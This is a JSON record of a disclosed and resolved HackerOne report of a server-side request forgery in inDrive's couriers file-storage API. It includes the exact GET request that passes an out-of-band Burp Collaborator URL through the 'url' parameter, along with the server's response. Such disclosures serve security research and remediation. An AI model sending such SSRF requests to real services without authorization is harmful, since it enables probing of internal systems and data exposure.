@@ -1,0 +1,147 @@
+{
+  "id": 2300358,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMzAwMzU4",
+  "url": "https://hackerone.com/reports/2300358",
+  "title": "SSRF in https://couriers.indrive.com/api/file-storage",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2023-12-31T13:31:16.960Z",
+  "submitted_at": "2023-12-31T13:31:17.102Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "cypher-28",
+    "url": "/cypher-28",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ynaduynof88mfbhtvbz73j6tafp7/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 58857,
+    "url": "https://hackerone.com/indrive",
+    "handle": "indrive",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/765s9sszvp9zyt9qwkeaa52vvkf3/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/765s9sszvp9zyt9qwkeaa52vvkf3/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "inDrive",
+      "twitter_handle": "indrive",
+      "website": "https://indrive.com/",
+      "about": "inDrive is a global mobility and urban services platform with over 150 million downloads  in more than 700 cities across 47 countries."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2024-01-16T17:11:29.622Z",
+  "bug_reporter_agreed_on_going_public_at": "2024-01-16T17:11:29.551Z",
+  "team_member_agreed_on_going_public_at": "2024-01-16T16:54:49.610Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nSSRF in  ` url ` parameter in https://couriers.indrive.com/api/file-storage\n\n## Steps To Reproduce:\n\nI will try to demonstrate it using burp collaborator \n\n  1. Request https://couriers.indrive.com/api/file-storage?url=http://va99zfc0lxpm75ogmcjhz8xij9pzdo.oastify.com  ( replace ` url ` value with your burp collaporator )\n\n  1. Notice the contnet being displayed in the response and also the Interaction in your burp collaborator\n\n* The Request \n```\nGET /api/file-storage?url=http://va99zfc0lxpm75ogmcjhz8xij9pzdo.oastify.com HTTP/2\nHost: couriers.indrive.com\nSec-Ch-Ua: \"Google Chrome\";v=\"119\", \"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"Linux\"\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9,ar;q=0.8\n\n\n```\n\n* The Response \n```\nHTTP/2 200 OK\nAuthorization: Bearer undefined\nContent-Disposition: attachment; filename=\"file\nDate: Sun, 31 Dec 2023 13:19:04 GMT\nX-Envoy-Upstream-Service-Time: 678\nServer: istio-envoy\nX-Cache: Miss from cloudfront\nVia: 1.1 33c6e91bdc193e34e8dcc80edc466018.cloudfront.net (CloudFront)\nX-Amz-Cf-Pop: MRS52-P2\nX-Amz-Cf-Id: 9GuBZr1A03ZS0bEYUbDp80JZj8dNYCE4YoVUImLD5RU15dEM-vs5fQ==\n\n<html><body>6zy5d1pwzab93qopx8jq2ezjigz</body></html>\n```\n\n\n## Supporting Material/References:\n\n████\n██████████\n████████\n\n## Note\nIf you request any website like for example ` www.google.com `,  ` https://couriers.indrive.com/api/file-storage?url=https://www.google.com `you will see its html content being displayed in the response \n\n## Impact\n\nThe ` url ` parameter doesn't sanitize The input properly  which can make the Attacker to request any website he wants",
+  "weakness": {
+    "id": 68,
+    "name": "Server-Side Request Forgery (SSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 136,
+  "voters": [
+    "g3ksec",
+    "aziz0x48",
+    "mrizzz",
+    "l0da",
+    "k0ns0l",
+    "a_b_d_e_l_r_a_h_m_a_n",
+    "0xcyborg",
+    "orange303",
+    "loaymorad",
+    "onlytesting",
+    "and 126 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 362641,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.indrive.com",
+    "max_severity": "high"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "id": 389538,
+      "category": "team",
+      "content": "Subscribe to our telegram channel with updates https://t.me/indrive_bbp",
+      "updated_at": "2024-01-08T12:22:44.410Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 2435873,
+        "username": "majesttic",
+        "name": "Kirill Egorov",
+        "bio": null,
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": null,
+        "created_at": "2022-08-16T07:58:13.212Z",
+        "url": "https://hackerone.com/majesttic",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "medium": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "xtralarge": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
